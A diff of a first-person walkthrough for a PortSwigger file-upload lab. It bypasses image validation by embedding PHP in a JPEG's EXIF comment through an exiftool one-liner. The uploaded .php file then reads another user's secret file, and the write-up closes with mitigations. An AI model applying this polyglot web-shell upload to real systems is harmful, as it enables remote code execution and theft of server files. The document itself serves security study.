@@ -2,22 +2,28 @@
 
 ## 📌 Lab Overview
 
-This lab demonstrates how an application can be bypassed when it validates uploaded files based on their **file signature (magic bytes)** rather than their actual contents.
+This lab demonstrates a **File Upload Vulnerability** caused by insufficient file content validation.
 
-The goal was to upload a file that:
+The application attempted to prevent malicious file uploads by verifying whether uploaded files were genuine images. Instead of relying only on file extensions, it validated the file signature and image metadata.
 
-- looks like a valid JPEG image
-- passes the application's image validation checks
-- still contains executable PHP code
-- executes when accessed through the web server
+However, the validation mechanism contained a flaw.
 
-This type of file is known as a **Polyglot File**.
+By creating a **polyglot file** (a file that is both a valid image and valid PHP code), it was possible to bypass the image validation checks while still achieving PHP code execution.
+
+This lab focused on:
+
+- File Upload Vulnerabilities
+- Polyglot Files
+- Image Metadata Abuse
+- EXIF Manipulation
+- Web Shell Uploads
+- Remote Code Execution (RCE)
 
 ---
 
 # 🔍 What is a Polyglot File?
 
-A **polyglot file** is a file that is valid in more than one format at the same time.
+A **polyglot file** is a file that is valid in multiple formats simultaneously.
 
 For example:
 
@@ -25,32 +31,40 @@ For example:
 Valid JPEG Image
 +
 Valid PHP Script
-=
-Polyglot File
 ```
 
-The application checks:
+can exist inside the same file.
+
+This allows attackers to bypass file validation checks because:
 
 ```text
-"Is this a JPEG?"
+Image Validator
+↓
+Sees Valid JPEG
+
+PHP Interpreter
+↓
+Executes PHP Code
 ```
 
-The web server later checks:
+The file satisfies both requirements at the same time.
 
-```text
-"Does this file contain PHP code?"
-```
+This technique is commonly used to bypass:
 
-Since the file satisfies both conditions, it can bypass upload validation and still execute as PHP.
+- file signature validation
+- MIME type validation
+- image verification checks
 
 ---
 
 # 🎯 Objective
 
-The objective of this lab was to:
+The goal of this lab was to:
 
-- bypass image validation
-- upload a PHP web shell
+- bypass image content validation
+- create a polyglot JPEG/PHP file
+- upload a malicious web shell
+- execute PHP code on the server
 - retrieve Carlos's secret
 - solve the lab
 
@@ -60,34 +74,37 @@ The objective of this lab was to:
 
 ## Screenshot 1 — Normal Webpage
 
-The application initially displayed a normal webpage containing a:
+![Screenshot 1](screenshot-upload1.png)
 
-```text
-My Account
-```
+The application initially displayed:
 
-button.
+- several products/pages
+- a **My Account** button
 
 ---
 
-## Screenshot 2 — Login
+## Screenshot 2 — Login Page
+
+![Screenshot 2](screenshot-upload2.png)
 
 After clicking **My Account**, I landed on the login page.
 
-The lab provided credentials:
+The lab provided valid credentials:
 
 ```text
 Username: wiener
 Password: peter
 ```
 
-I entered them and logged in successfully.
+I entered the credentials and logged in.
 
 ---
 
 ## Screenshot 3 — Avatar Upload Functionality
 
-After logging in as:
+![Screenshot 3](screenshot-upload3.png)
+
+After successful authentication as:
 
 ```text
 wiener
@@ -98,7 +115,7 @@ I could see:
 - Update Email functionality
 - Avatar Upload functionality
 
-To understand how uploads worked, I selected:
+To verify normal upload behavior, I selected:
 
 ```text
 luffy.jpg
@@ -110,21 +127,23 @@ and uploaded it.
 
 ## Screenshot 4 — Successful Image Upload
 
+![Screenshot 4](screenshot-upload4.png)
+
 The application responded:
 
 ```text
 The file avatars/luffy.jpg has been uploaded.
 ```
 
-This confirmed that image uploads were functioning correctly.
+confirming that image uploads worked correctly.
 
 ---
 
-## Screenshot 5 — Attempting a PHP Upload
+## Screenshot 5 — Attempting a Direct PHP Upload
 
-After returning to **My Account**, I confirmed the image was displayed correctly.
+![Screenshot 5](screenshot-upload5.png)
 
-I then selected:
+After returning to the account page, I selected:
 
 ```php
 virus.php
@@ -142,100 +161,103 @@ and attempted to upload it.
 
 ## Screenshot 6 — Upload Rejected
 
+![Screenshot 6](screenshot-upload6.png)
+
 The application responded:
 
 ```text
-Error.
-File is not a valid image.
-
+Error. File is not a valid image.
 Sorry, there was an error uploading your file.
 ```
 
-### What Happened?
+### Why Did This Happen?
 
-Unlike previous labs, the application was not only checking:
+Unlike previous labs, the application was not simply checking:
 
 ```text
 File Extension
 ```
 
-It was also validating the file's actual image structure.
-
-Many applications verify:
+Instead it was validating:
 
 ```text
-JPEG Signature
-PNG Signature
-GIF Signature
+Actual File Content
+↓
+Image Signature
+↓
+Image Metadata
 ```
 
-before accepting uploads.
+A genuine JPEG contains specific image headers and metadata.
 
-This is commonly called:
+The uploaded PHP file contained:
 
 ```text
-File Signature Validation
+PHP Code Only
 ```
 
-or
-
-```text
-Magic Byte Validation
-```
-
-Since:
-
-```text
-virus.php
-```
-
-was purely a PHP file and did not contain a valid JPEG header, the upload was rejected.
+and therefore failed the image validation process.
 
 The application essentially performed:
 
 ```text
-Does file end with .jpg?
-      +
-Does file actually look like a JPEG?
+Is this a real image?
+↓
+No
+↓
+Reject Upload
 ```
 
-The second check failed.
+This meant a simple PHP upload would not work.
 
 ---
 
-## Screenshot 7 — Inspecting a Legitimate JPEG
+## Screenshot 7 — Inspecting the Legitimate Image
 
-I moved to the terminal and inspected the original image:
+![Screenshot 7](screenshot-upload7.png)
+
+To understand why the image passed validation, I examined the JPEG using:
 
 ```bash
 exiftool luffy.jpg
 ```
 
-The output displayed JPEG metadata and confirmed:
+The output displayed metadata such as:
 
 ```text
-File Type : JPEG
+File Type: JPEG
+MIME Type: image/jpeg
+Image Dimensions
+Encoding Information
 ```
 
-This showed that the file contained valid image metadata.
+This confirmed that:
+
+```text
+luffy.jpg
+```
+
+was recognized as a legitimate image.
 
 ---
 
 ## Screenshot 8 — Inspecting the PHP File
 
-Next, I inspected:
+![Screenshot 8](screenshot-upload8.png)
+
+Next, I examined the PHP file:
 
 ```bash
 exiftool virus.php
 ```
 
-The output confirmed:
+The output showed:
 
 ```text
-File Type : PHP
+File Type: PHP
 ```
 
-This explained why the upload was being blocked.
+which explained why the upload validation rejected it.
 
 The application expected:
 
@@ -251,11 +273,11 @@ PHP
 
 ---
 
-## Screenshot 9 — Creating a Polyglot File
+## Screenshot 9 — Creating the Polyglot File
 
-To bypass the validation, I decided to hide PHP code inside a legitimate JPEG image.
+![Screenshot 9](screenshot-upload9.png)
 
-I used:
+To bypass the validation, I created a polyglot file using:
 
 ```bash
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" luffy.jpg -o qwert.php
@@ -263,25 +285,29 @@ exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret'
 
 ### Command Breakdown
 
-#### exiftool
+#### Part 1
 
 ```bash
 exiftool
 ```
 
-A tool used to read and modify metadata inside files.
+Used to read and modify image metadata.
 
 ---
 
-#### -Comment="..."
+#### Part 2
 
 ```bash
--Comment="..."
+-Comment="
+...
+"
 ```
 
-Adds a custom comment into the image metadata.
+Adds a custom comment field inside the JPEG metadata.
 
-The comment I inserted was:
+---
+
+#### Part 3
 
 ```php
 <?php echo 'START ' .
@@ -289,79 +315,84 @@ file_get_contents('/home/carlos/secret')
 . ' END'; ?>
 ```
 
----
+This PHP code:
 
-#### START and END
-
-```php
-START
+```text
+Reads Carlos's Secret
+↓
+Prints START
+↓
+Prints Secret
+↓
+Prints END
 ```
 
-and
+The markers:
 
-```php
+```text
+START
 END
 ```
 
-were added as markers.
-
-This makes it easier to locate the secret when the file executes.
-
-Example output:
-
-```text
-START secret_value END
-```
+make it easier to locate the secret in the output.
 
 ---
 
-#### file_get_contents()
-
-```php
-file_get_contents('/home/carlos/secret')
-```
-
-Reads Carlos's secret file from the server.
-
----
-
-#### luffy.jpg
+#### Part 4
 
 ```bash
 luffy.jpg
 ```
 
-The legitimate JPEG image that already contains valid image headers and metadata.
+Source image.
 
 ---
 
-#### -o qwert.php
+#### Part 5
 
 ```bash
 -o qwert.php
 ```
 
-Creates a new output file named:
+Creates a new file named:
 
 ```text
 qwert.php
 ```
 
-The resulting file:
+### Overall Logic
+
+The idea was:
 
 ```text
-Looks like JPEG
-+
-Contains PHP code
-=
-Polyglot File
+Take Legitimate JPEG
+↓
+Inject PHP into Metadata
+↓
+Save As .php
+↓
+Bypass Image Validation
+↓
+Execute PHP Code
 ```
+
+This produced a file that was simultaneously:
+
+```text
+Valid JPEG
++
+Valid PHP
+```
+
+making it a polyglot.
 
 ---
 
 ## Screenshot 10 — Verifying the Polyglot File
 
-I inspected the newly created file:
+![Screenshot 10](screenshot-upload10.png)
+
+I inspected the new file:
 
 ```bash
 exiftool qwert.php
@@ -369,15 +400,19 @@ exiftool qwert.php
 
 The output showed:
 
-- JPEG metadata
-- Image information
-- My injected comment
+```text
+JPEG Metadata
+Comment Field
+Image Information
+```
 
-This confirmed the file was still a valid image while also containing PHP code.
+The file still looked like a valid JPEG image while now containing PHP code inside its metadata.
 
 ---
 
 ## Screenshot 11 — Uploading the Polyglot File
+
+![Screenshot 11](screenshot-upload11.png)
 
 I returned to the application and uploaded:
 
@@ -385,11 +420,13 @@ I returned to the application and uploaded:
 qwert.php
 ```
 
-through the avatar upload functionality.
+Because the file still contained valid JPEG structures, it passed the application's image validation checks.
 
 ---
 
 ## Screenshot 12 — Upload Successful
+
+![Screenshot 12](screenshot-upload12.png)
 
 The application responded:
 
@@ -397,123 +434,58 @@ The application responded:
 The file avatars/qwert.php has been uploaded.
 ```
 
-This confirmed that the image validation had been bypassed successfully.
-
-Why?
-
-Because the application saw:
-
-```text
-Valid JPEG Metadata
-```
-
-and accepted the upload.
+confirming that the polyglot file bypassed the upload restrictions.
 
 ---
 
-## Screenshot 13 — Executing the Web Shell
+## Screenshot 13 — Executing the Polyglot Web Shell
 
-After returning to **My Account**, the avatar appeared as a broken image.
+![Screenshot 13](screenshot-upload13.png)
 
-I right-clicked the image and selected:
+After returning to the account page, the avatar appeared as a broken image.
 
-```text
-Open Image in New Tab
-```
+I opened the image in a new tab.
 
-The page displayed a large amount of image data, but hidden inside it was:
+Instead of displaying an image, the server executed the embedded PHP code.
 
-```text
-START xiHVfKOVRux80u2912KPhHLzjhTp5Xu0 END
-```
-
-as shown in the uploaded screenshot.
-
-### What Happened?
-
-When the file was requested:
+Within the page output I found:
 
 ```text
-qwert.php
+START
+<secret>
+END
 ```
 
-Apache treated it as:
+The markers clearly identified Carlos's secret.
 
-```text
-PHP
-```
-
-because of its extension.
-
-The server executed the PHP code embedded in the image comment.
-
-That PHP code executed:
-
-```php
-file_get_contents('/home/carlos/secret')
-```
-
-and printed:
-
-```text
-START <secret> END
-```
-
-inside the image output.
-
-The markers helped identify the secret among the image's binary data.
-
-The secret was:
-
-```text
-xiHVfKOVRux80u2912KPhHLzjhTp5Xu0
-```
-
-I copied it and submitted it through the lab banner.
+I copied the secret and submitted it through the lab banner.
 
 The lab was successfully solved.
 
 ---
 
-# 💡 Why This Attack Worked
+# ⚠ Why This Vulnerability Exists
 
-The application validated:
+The vulnerability existed because:
 
-```text
-File Signature
-```
+- the application trusted image validation alone
+- uploaded files were executable by the server
+- image metadata was not sanitized
+- PHP code embedded inside metadata was not detected
 
-but trusted:
-
-```text
-File Extension
-```
-
-for execution.
-
-Validation Logic:
+The resulting logic became:
 
 ```text
-Is it a valid image?
-✓ Yes
+Image Validator
+↓
+Valid JPEG
+
+PHP Interpreter
+↓
+Executes Embedded PHP
 ```
 
-Execution Logic:
-
-```text
-Does it end with .php?
-✓ Yes
-```
-
-Result:
-
-```text
-Upload Allowed
-+
-PHP Executed
-=
-Remote Code Execution
-```
+Both systems viewed the same file differently.
 
 ---
 
@@ -521,11 +493,12 @@ Remote Code Execution
 
 An attacker could potentially:
 
+- bypass image upload restrictions
 - upload web shells
-- execute arbitrary PHP code
+- achieve Remote Code Execution
 - read sensitive files
-- steal credentials
-- gain full server compromise
+- execute arbitrary server-side code
+- fully compromise the application
 
 ---
 
@@ -533,56 +506,63 @@ An attacker could potentially:
 
 To prevent this issue:
 
-- validate both file signatures and extensions
+- strip metadata from uploaded images
+- re-encode images server-side
 - store uploads outside the web root
 - disable script execution in upload directories
-- rename uploaded files using server-generated names
-- strip metadata from uploaded images
-- use image re-encoding before storage
+- validate file contents after processing
+- generate server-side filenames
 
 Example:
 
 ```text
-Upload
+Upload Image
 ↓
-Validate Signature
+Strip Metadata
 ↓
 Re-encode Image
 ↓
-Generate Random Filename
+Store Safely
 ↓
-Store Outside Web Root
+Serve as Static Content
 ```
 
 ---
 
 # 🧠 Skills Learned
 
-- File Upload Vulnerabilities
-- Polyglot Files
-- JPEG Metadata Manipulation
-- EXIF Data Abuse
+- File Upload Testing
+- Polyglot File Creation
+- EXIF Metadata Manipulation
+- Image Validation Bypass
 - Web Shell Upload Techniques
 - Remote Code Execution
-- File Signature Validation Bypass
+- ExifTool Usage
 
 ---
 
 # 🧰 Tools Used
 
 - Burp Suite
+- Burp Repeater
 - ExifTool
-- Firefox
+- Browser Developer Tools
 - PortSwigger Web Security Academy
 
 ---
 
 # ✅ Conclusion
 
-This lab demonstrated how relying solely on image validation is insufficient when handling file uploads.
+This lab demonstrated how image validation alone is not sufficient to secure file upload functionality.
 
-By embedding PHP code inside JPEG metadata, I created a **polyglot file** that was simultaneously a valid image and a valid PHP script.
+By embedding PHP code inside JPEG metadata and creating a polyglot file, I was able to bypass the application's image validation checks while still achieving PHP execution on the server.
 
-The application accepted the file because it passed image validation, while Apache later executed the embedded PHP code because of the `.php` extension.
+Through this lab, I learned:
 
-This resulted in successful Remote Code Execution and allowed retrieval of Carlos's secret, ultimately solving the lab.
+- how polyglot files work
+- how image metadata can be abused
+- how EXIF comments can contain executable code
+- why image validation alone is insufficient
+- how file upload vulnerabilities can lead to Remote Code Execution
+
+The lab was successfully solved by creating a JPEG/PHP polyglot file, bypassing image validation, executing server-side PHP code, and retrieving Carlos's secret.
